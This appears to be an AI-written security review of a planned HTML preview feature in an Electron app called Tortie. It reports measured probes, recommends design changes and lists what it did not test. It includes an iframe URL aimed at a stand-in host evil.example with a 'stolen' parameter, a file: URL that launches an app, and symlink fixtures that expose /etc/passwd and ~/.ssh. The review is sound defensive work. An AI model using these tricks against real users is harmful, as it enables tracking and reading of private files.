  gmux-preview://local/__external?u=https%3A%2F%2Fevil.example%2Fzero-click%3Fstolen%3D1
```

Part 1's handler reads `u` and calls `shell.openExternal`. So opening the Preview tab on a file
from a cloned repository opens the user's browser at an address the repository author picked.
Substituting `file:///Applications/Calculator.app` for the `https:` URL produced the same event
with the same fidelity, so the scheme is the author's choice too. The same attack works from
inside a `srcdoc` frame, because a nested `gmux-preview:` iframe is allowed there as well. This is
not a defect of the scheme. It is a defect of intercepting a navigation and acting on its URL.

## 2. What I would cut, change and confirm, in one table

| # | Item | Verdict | Reason, with the measurement |
|---|---|---|---|
| 1 | The `__external` sentinel (part 1, §7.1) | **Cut** | Zero-click `shell.openExternal` with an author-chosen URL and an author-chosen scheme. Measured, probe Z1, Z2, Z6 |
| 2 | DOMPurify as a new dependency | **Cut** | Only the `srcdoc` route needs it, and I am recommending against that route. If `srcdoc` wins, take DOMPurify anyway rather than hand-rolling a schema |
| 3 | pdfjs-dist | **Cut** | 2.9 MB of assets and a wasm blob inside a signed and notarized app, to replace a viewer Chromium already ships |
| 4 | Jupyter notebooks and `anser` | **Cut** | Part 2 counted 7 unique notebooks across 233 repositories. About 900 lines for 7 files |
| 5 | CSV, TSV and Quarto | **Defer, written down** | Monaco already shows the text. Column alignment is the whole gain |
| 6 | Mermaid | **Defer to its own phase** | It is the one item that changes the markdown pipeline's security posture, and it deserves the scrutiny HTML is getting, not a ride on someone else's phase |
| 7 | SVG | **Nothing to do** | Already shipped. `EditorPanel.tsx:203` gives Preview, Source and Split to `tab.markdown \|\| tab.svg` |
| 8 | Root containment in the handler | **Change** | A naive prefix check served `/etc/passwd` through a symlink named `docs/notes.html`. Measured |
| 9 | The preview URL shape | **Change** | Part 1 says "the project root", singular. Tortie holds several project tabs in one window |
| 10 | The child CSP header | **Change** | It must be impossible to build a response without it, and a test must count requests at a sink |
| 11 | `frame-src gmux-preview:` | **Confirm** | The app renderer still cannot post. Measured again, independently |
| 12 | The sandbox attribute, with no `allow-scripts` | **Confirm** | It is what refuses `<meta http-equiv="refresh">`, and that is load bearing |
| 13 | Denial of service by a scriptless page | **Confirm safe** | I tried and failed. Largest host frame gap 35 ms |
| 14 | The bridge, the disk and the network from inside the frame | **Confirm safe** | `window.gmux` undefined, parent read threw `SecurityError`, 0 of 4 probes reached the sink |

## 3. The attacks that worked

### 3.1 Zero-click `shell.openExternal`, through a nested iframe

The probe is `main4.js`, results in `out4.json`. The host window copies Tortie exactly, including
the byte-identical policy from `src/renderer/index.html:8` plus `frame-src gmux-preview:`. The
preview frame carried `sandbox=""`, with no `allow-scripts`. The child response carried the full
policy from part 1 §7, `default-src 'none'` and the rest.

| Probe | Page content | `will-frame-navigate` fired with |
|---|---|---|
| Z1 | a 1x1 nested iframe at `/__external?u=https%3A%2F%2Fevil.example%2Fzero-click%3Fstolen%3D1` | that exact URL |
| Z2 | the same, with `u=file%3A%2F%2F%2FApplications%2FCalculator.app` | that exact URL |
| Z6 | the same nested iframe, but inside a `srcdoc` frame instead | that exact URL |

Nothing was clicked in any of the three. There is no script in any of the three. The child policy
allows the nested frame because part 1's own header contains `frame-src gmux-preview:`, and it
needs to, because real documentation sites nest frames.

Two separate problems live in that one event.

- **The scheme is not checked by the URL parser.** `u` is a query parameter and it holds whatever
  the author typed. On macOS, `shell.openExternal` on a `file:` URL asks Launch Services to open
  the path, and custom schemes registered by other installed applications are reachable the same
  way. An allowlist of `http:` and `https:` is required, and `src/main/index.ts:322` already has
  one for the terminal and markdown paths. Any new interception must reuse it and not write a
  second one.
- **There is no user action to require.** I checked whether an authored click is needed and it is
  not. An anchor clicked from the page's own script fired the same event with no user gesture,
  probe `L_sentinel_http` in `out3.json`. The one thing that does block the no-click path today is
  the sandbox attribute, and it blocks only the `<meta refresh>` form of it, not the nested frame
  form.

**What I would build instead.** Make external anchors inert. Rewrite every `http:` and `https:`
`href` to nothing, keep the visible text, and put the original address in the `title` attribute so
hovering shows where it pointed. Add the count to the line part 1 already proposes under the frame,
so it reads with the refusals. Relative links inside the root keep working untouched, which is the
part that makes a generated documentation site browsable, and that part costs nothing.

That leaves external links dead, which is the same place part 3 §2.5 ends up for the `srcdoc`
route. Part 3 called it "the honest answer for HTML". I agree with part 3 and not with part 1 here.

**If external links must work in a later phase**, the route to test is the popup route, not
navigation. An anchor with `target="_blank"` reaches the existing `setWindowOpenHandler` at
`src/main/index.ts:321`, which already denies everything and already filters on `http(s)`. I
measured that it reaches the handler with the true URL, `https://example.com/manual`, from a frame
with no sandbox attribute. **I could not measure it from a sandboxed frame and I am not claiming it
works there.** Section 7 says why.

### 3.2 A naive containment check serves `/etc/passwd`

`symlink.mjs`, plain Node, no Electron. A project root with a symlink in it, which is a thing git
stores and therefore a thing `git clone` creates.

```
  proj/docs/index.html          a real file
  proj/docs/notes.html   ->     /etc/passwd
  proj/ssh               ->     ~/.ssh
```

| Request | Handler with `join` plus a string prefix check | Handler with `realpath` on both sides |
|---|---|---|
| `/docs/index.html` | served | served |
| `/docs/notes.html` | **served, and the first 30 bytes are the real `/etc/passwd`** | refused, containment |
| `/../../../../etc/passwd` | refused, prefix | refused, no such file |
| `/docs/up/docs/index.html`, through a `..` symlink | served, correctly | served, correctly |

Part 1 §7 point 3 says symlinks still escape and that the handler must call `realpath`. That is
right and this is the number behind it. Two further details that the phase will hit and that part 1
does not mention.

- **The root has to be resolved too, not only the file.** A project reached through a symlinked
  path, which is ordinary on macOS because `/tmp` is a link to `/private/tmp`, fails the check when
  only the file is resolved. Measured, `REFUSED containment` for a legitimate file. It fails closed,
  so it is a bug and not a hole, and it will be reported as "the preview shows nothing".
- **`realpath` does not normalise letter case.** On this APFS volume `PROJ/docs/index.html` resolves
  and comes back spelled `PROJ`, so a prefix compare against `proj` returns false. Fails closed
  again. The fix is to resolve the root the same way the request is resolved, and never to lowercase
  both sides.

### 3.3 The child policy header, quantified as a single point of failure

Part 1 says the header is a single point of failure. It is, and the failure has two different sizes
depending on whether the sandbox attribute is also wrong. Requests counted at a local HTTP server,
`out.json`.

| Sandbox attribute | Child CSP header | Requests that left | What left |
|---|---|---|---|
| `sandbox=""` | present | 0 | nothing |
| absent | present | 0 | nothing |
| `sandbox=""` | **absent** | 2 | the remote `<img>` and the remote `<link rel=stylesheet>` |
| absent | **absent** | 4 | those two, plus `fetch()` and `navigator.sendBeacon` |

So the sandbox attribute alone is worth having and is not sufficient. With the header gone, every
previewed page from a cloned repository loads its remote images. A remote image in a repository
file is a tracking pixel that reports that this machine opened this file. The markdown preview
already refuses these and says so in `src/main/assets/protocol.ts`, so the HTML preview refusing
them is consistency and not a new rule.

One design rule follows from that. There must be exactly one function that builds a preview
response, the header must be set inside it, and no other code path may construct a `Response` for
this scheme. The test that catches a regression is not a unit test on the header string. It is the
sink-counting test, because that is the one that fails when someone adds a second response path.

## 4. The attacks that failed, which is the case for the design

I list these because a verifier should not have to repeat them, and because "we tried and could not"
is worth more than "we reasoned it was fine".

### 4.1 Freezing Tortie with a page that has no script

This was my main hope for a denial of service, because a preview pane that hangs the window looks
to the user exactly like Tortie crashing, and no script is needed to make layout expensive.

A 3,006,265 byte page with 6,000 nested flex `<div>` elements, 120,000 bordered inline blocks with
two text shadows and a blur filter, and a descendant selector six levels deep. It rendered. The
child reported 126,006 elements and a 30,006 pixel document. While it loaded and laid out, the host
renderer was sampled with `requestAnimationFrame` for 9 seconds.

| Frame kind | Largest host frame gap | Frames over 100 ms | Samples |
|---|---|---|---|
| `srcdoc`, `sandbox=""` | 32 ms | 0 | 1,079 |
| `gmux-preview:`, `sandbox=""` | 35 ms | 0 | 1,077 |

A second shape, one `<img>` holding a 30,000 by 30,000 pixel SVG, gave a largest gap of 10 ms over
6 seconds. The host never stuttered in any run.

The reason is process isolation, and here I have a correction for part 1. Part 1 §5.2 presents the
frame's own renderer process as something the scheme gives you that `srcdoc` does not. Both get it.

```
  host renderer            pid 81965
  srcdoc sandbox="" frame  pid 81979     different process
  gmux-preview: frame      pid 81980     different process
```

An opaque origin is enough for Chromium to isolate the frame, so process isolation is not a reason
to prefer the scheme over `srcdoc`. The reasons to prefer the scheme are the ones part 1 gives in
§7, which are relative resolution and local stylesheets.

### 4.2 Flooding the main process through the protocol handler

A scriptless page with 8,000 one-pixel images, each a separate handler call. This one is not
nothing, and it is the only place where a previewed file reaches the process that supervises tmux.

| Measurement | Value |
|---|---|
| Handler invocations from one document | 8,001 |
| Main process CPU inside the handler | 63 ms |
| Largest gap in a 10 ms main-process timer | 106 ms |
| Largest host renderer frame gap | 42 ms |

About 96 ms of added main-process latency for 8,000 references. That is a delay and not a freeze,
and a page can hold more references than that. I would put a request budget on the document, refuse
past it, and add the refusal to the count line under the frame. It is a few lines and it turns an
unbounded number into a bounded one.

### 4.3 The bridge, the parent frame and the disk

The child probe page tried to read the bridge and the parent. Frame served from `gmux-preview:`,
with no sandbox attribute at all, so this is the worst case for that lock.

| Probe | Result |
|---|---|
| `window.origin` | `gmux-preview://local` |
| `typeof window.gmux` | `undefined` |
| `typeof window.require` | `undefined` |
| `typeof window.process` | `undefined` |
| `window.parent.gmux` | threw `SecurityError` |
| `fetch('gmux-preview://local/secret.txt')`, its own origin | blocked, by the child policy |
| `localStorage.setItem` | writable |

The preload does not run in the subframe, because `nodeIntegrationInSubFrames` is off, which is the
default and which `src/main/index.ts:310` does not change. The parent read failed on the origin, not
on the sandbox. Chromium's message names the reason.

```
  Blocked a frame with origin "file://" from accessing a frame with origin
  "gmux-preview://local". Protocols must match.
```

`localStorage` being writable is worth one line in the spec. It is per origin, and every preview in
every project shares the origin `gmux-preview://local`, so one repository's page can leave a value
that another repository's page reads. Nothing sensitive is there to steal, and I could not build an
attack out of it, but it is a shared surface that does not need to exist. Giving each project its
own host segment removes it, and section 5 wants that for another reason anyway.

### 4.4 The application policy after the change

I repeated part 1's measurement independently, in my own harness, with `frame-src gmux-preview:`
added to the byte-identical policy.

```
  fetch('http://127.0.0.1:53692/from-app')  ->  REJECTED: Failed to fetch
  requests logged at the server              ->  0
```

Chromium named `default-src 'self'` as the directive, with the note that `connect-src` was not set.
Research 37 §8.1 holds as written. **I confirm part 1 on this and I want to be precise about what
the confirmation covers.** It covers the renderer. It does not cover `shell.openExternal`, which is
in the main process, is outside every content policy, and is exactly what section 3.1 is about. The
sentence in research 37 §8.1 is that the process holding the material cannot post and the process
that can post has none of the material. A sentinel that carries a string from a previewed file into
a main-process network action is the one thing in this phase that touches that sentence. It does
not leak the project tree, because the previewed page cannot read the project tree. It does leak the
fact that this machine opened this file, at a time and with an identifier the author chose. Cutting
the sentinel keeps §8.1 true in structure and not only in the renderer.

### 4.5 `<meta http-equiv="refresh">`, and why the sandbox attribute is load bearing

The no-click path I expected to find first was a meta refresh. It is refused, and Chromium says why.

```
  Refused to execute the redirect specified via '<meta http-equiv='refresh' content='...'>'.
  The document is sandboxed, and the 'allow-scripts' keyword is not set.
```

That refusal is bought by the absence of one keyword. Part 1 §4 already says `allow-same-origin`
must never appear. Add `allow-scripts` to that sentence, write both into a test that asserts the
exact sandbox attribute string, and put a comment at the attribute saying what breaks if it grows.
The nested iframe in section 3.1 is the proof that this lock is thinner than it looks, because it
gets past this refusal by not being a redirect at all.

## 5. The gap neither part addresses. Tortie has more than one project open

Part 1 says the handler serves "inside the project root". Tortie's own scope note says multi-project
tabs in one window are a reason the product exists. So the handler is given a path and must decide
which of several roots it belongs to, and the URL is the only thing carrying that decision, and the
URL is under the control of the document once it starts making relative requests.

`gmux-preview://local/<path>` cannot express it. Two shapes can.

| Shape | How the root is decided | What a page inside the frame can reach |
|---|---|---|
| `gmux-preview://<opaque-token>/<path relative to that root>` | main holds a map from token to root, made when the tab opens | only that root, because relative URLs keep the host segment and `..` is clamped at the host by the URL parser |
| `gmux-preview://local/<absolute path>` | none. every path is its own root | the whole disk, subject only to an extension allowlist, which is what `gmux-asset:` already is |

Take the first. It also gives each project its own origin, which removes the shared `localStorage`
noted in section 4.3, and it keeps the token out of the user's sight, which matters because the
frame's URL is not shown anywhere.

## 6. The scope argument, made as strongly as I can

CLAUDE.md asks of every feature whether it serves the agentic coding workflow or exists because IDEs
have it, and it caps parity work after Phase 14. Part 2 answers that question for file types and
lands on four. I would ship one.

**Phase 20.5 should be HTML only.** Here is the case.

First, part 2's own number argues against most of the list. It stripped scripts from 1,052 HTML
files and found that 63 percent render blank or nearly blank without JavaScript. So the headline
feature of this phase is already known to show nothing about two thirds of the time. Adding three
more viewers beside a feature with that hit rate is spending the phase's attention in the wrong
place. It also means Source, not Preview, is the correct default mode for an HTML tab, and the empty
state needs copy that says the page builds itself with JavaScript. Part 2 says both of these and
they are the most useful sentences in it.

Second, the security work in this phase is not divisible. A new privileged scheme, a containment
check, a per-response policy, a sandbox attribute that must never grow, and a test that counts
requests at a sink are all one piece of work, and all of it exists to serve HTML. CSV needs none of
it. Notebooks need none of it. Every hour spent on a CSV table is an hour not spent on the one
mechanism in this phase that can hurt the user.

Third, item by item.

| Item | Reach, from part 2 | The guardrail question | Verdict |
|---|---|---|---|
| HTML | 1,052 files, 63% of them blank without script | The operator asked for it | Build it |
| SVG | 1,548 files | Already shipped, verified today at `EditorPanel.tsx:203` | Nothing to do |
| Mermaid | 289 diagrams, 41 of 233 repos | Serves the workflow. Agents write mermaid into docs and Tortie's own docs have it | Its own phase, section 8 says why |
| PDF | 82 files, 17 repos | Serves it weakly. A PDF in a repo is usually a spec | After HTML, if it really is two CSP tokens |
| CSV and TSV | 101 files, 17 repos | IDE furniture. Monaco already shows the text | Defer, written down |
| Jupyter | 7 unique files | IDE furniture | Cut |
| Quarto | 179 files, 7 repos | IDE furniture | Cut |

The honest counter-argument, stated so the operator can overrule me. Part 2 counted the files and I
did not. If the operator's own repositories are the 17 with PDFs and the 7 with Quarto, the reach
numbers understate the value to the person actually using the application. That is a judgement the
operator owns and not a measurement I can settle.

## 7. The libraries

I verified every package fact independently against the npm registry today. **Part 3's table is
correct in every row I checked.** Versions, licences and publish dates all matched.

| Package | Version | Licence | Last publish | My verdict |
|---|---|---|---|---|
| dompurify | 3.4.13 | MPL-2.0 or Apache-2.0 | 2026-08-03 | Not needed. See below |
| pdfjs-dist | 6.2.108 | Apache-2.0 | 2026-07-28 | Cut |
| anser | 2.3.5 | MIT | 2025-12-15 | Cut with notebooks |
| papaparse | 5.5.4 | MIT | 2026-06-19 | Cut, and part 3 already cut it |
| sanitize-html | 2.17.6 | MIT | 2026-07-10 | Cut, and part 3 already cut it |
| csv-parse | 7.0.2 | MIT | 2026-08-02 | Cut, and part 3 already cut it |
| mermaid | 11.16.1 | MIT | 2026-08-04 | Its own phase |

**The dependency count for HTML is zero, and part 3 says so itself in its section 9.** Part 3's
DOMPurify recommendation is conditional on the `srcdoc` route. The scheme route puts the protection
in a response header, so the file is served as authored and nothing needs sanitising. I am
recommending the scheme route, so DOMPurify goes.

There is one place the scheme route still needs to modify the bytes, which is neutralising external
anchors, and part 1 §7.1 correctly says a regular expression is not good enough for that. **It needs
no package either.** `parse5` 7.3.0 is already installed, as a transitive dependency of
`rehype-raw`, alongside `hast-util-raw` 9.1.0, `hast-util-sanitize` 5.0.2, `hast-util-to-html` 9.0.5
and `property-information` 7.2.0. A real parse, an attribute rewrite and a serialise are available
in the main process for the cost of promoting `parse5` to a direct dependency, which adds zero
packages to the lock file. Promote it rather than importing a transitive by accident, so the
version is pinned by us.

**pdfjs-dist, cut.** 502 KB of gzipped JavaScript and 2.9 MB of assets including a wasm binary,
inside an application that is signed and notarized, to replace a viewer Chromium already ships and
that part 2 measured working on a 22 page 4.3 MB file under the byte-identical policy. If PDF ships,
it ships as `<embed>` and two CSP tokens. Two things about the built-in viewer belong in the spec
because they are user-visible and cannot be changed. Its toolbar cannot be themed, and it has a
download button.

**Mermaid, priced honestly.** It is MIT, it is current, and it needs no `eval`. I checked the
bundle that part 2 built and it contains zero occurrences of `new Function` and zero of `eval(`, so
`script-src 'self'` is not a problem. The cost is elsewhere.

| Cost | Number |
|---|---|
| Direct dependencies | 21 |
| Transitive packages added, part 2's count | 107, on a lock file that holds 643 today |
| Bundle, gzipped | 948,563 bytes |
| Second markdown parser it brings | `marked`, next to the existing `react-markdown` |
| Sanitiser it brings | `dompurify`, vendored inside it, at a version we do not choose |

The last two rows are why it should not ride along on this phase. Mermaid renders labels through
`foreignObject`, its own safety at `securityLevel: 'strict'` rests on its bundled DOMPurify, and the
output has to get past `rehype-sanitize` in `src/renderer/editor/markdown/pipeline.ts`, which part 1
§5.4 measured reducing an inline SVG to its text. Making a hole in that schema for mermaid's output
is a change to the security posture of the markdown preview, which is the feature the operator uses
most. Part 2 lists that reconciliation as unverified. It should be a phase with a spec, not a line
item.

**Part 2's mermaid measurement did not run under Tortie's policy.** The test page at
`scratchpad/mermaidtest.html` carries no CSP meta tag at all, and it renders with an inline
`<script type="module">`, which `script-src 'self'` forbids. The timings, 14 ms to 40 ms, and the
injection result, `PWNED=[]`, are still worth having. The claim "it works under our policy" is not
established by that run.

## 8. What the phase brief should say

- Tier 3. This is untrusted content from repositories that Phase 18.6 taught the application to
  clone. It is not a cosmetic change and it is not a single-subsystem feature.
- The verifier is not the builder, and the verifier's evidence is a request count at a local HTTP
  sink, not a reading of the handler.
- Ship Preview, Source and Split for HTML, with **Source as the default mode**, and a line under the
  frame that counts what was refused.
- External links are inert in this phase, with the address in a `title` attribute.
- No `allow-scripts` and no `allow-same-origin`, asserted by a test on the literal attribute string.
- One response constructor, with the header inside it.
- `realpath` on both the request and the root, with the `/etc/passwd` symlink from section 3.2 as a
  fixture.
- A per-document request budget in the handler.
- The scheme's host segment names the project, not `local`.

**One warning about how this gets verified, which cost me an hour.** A sandboxed preview frame
cannot be driven by the usual harness. `webContents.sendInputEvent` does not reach an out-of-process
iframe. I clicked at the correct coordinates inside a loaded frame, with the window shown and the
application focused, and nothing happened, in both a sandboxed and an unsandboxed frame, probe
`main6.js`. `WebFrameMain.executeJavaScript` does reach a `gmux-preview:` frame, and it throws on a
frame with an opaque origin, so it works for an unsandboxed probe and not for the real thing. A
verifier who plans to prove "clicking a link does X" needs a method neither of those provides, and
should budget for it rather than discover it.

## 9. What is not true, and what I did not check

- **I could not test the popup route under a sandbox.** `sandbox="allow-popups"` with a real user
  click was not reachable with the tools above. What I measured is that an anchor with
  `target="_blank"` reaches `setWindowOpenHandler` with the true URL from an unsandboxed frame, and
  that a page's own script cannot click anything when `allow-scripts` is absent, which is why the
  sandboxed case produced no event. Treat the popup route as untested.
- The zero-click sentinel attack was measured up to the `will-frame-navigate` event. **I did not
  call `shell.openExternal`**, on purpose, so I have not seen a browser window open. The event
  carrying the attacker's URL to a handler that part 1 specifies as calling `shell.openExternal` is
  the whole claim.
- My denial of service attempt failed at 126,006 elements. I did not try a larger page, a CSS
  counter recursion, a font with pathological metrics, or many preview tabs at once. "I could not
  freeze it" is not "it cannot be frozen".
- The 8,000 request flood used a handler that reads with `readFileSync`. The real handler will
  stream through `net.fetch` and resolve symlinks, so its per-request cost will differ from the
  63 ms measured here, probably upward.
- I did not re-count part 2's corpus. The 233 repositories, the 63 percent blank figure and the file
  counts are taken from part 2 as given, and section 6's argument leans on them.
- I did not build anything in Tortie. Every measurement is from a standalone Electron application
  that copies Tortie's window options and policy. It is not the real renderer, it has no React tree,
  and it has no editor panel.
- Case handling in the containment check was tested on one APFS volume on one machine. I did not
  test a case-sensitive volume and I did not test a network mount.
- I am not a browser security researcher. What I can say is that five specific attacks were tried
  and four of them failed against this design, and that the fifth is fixed by deleting a feature.
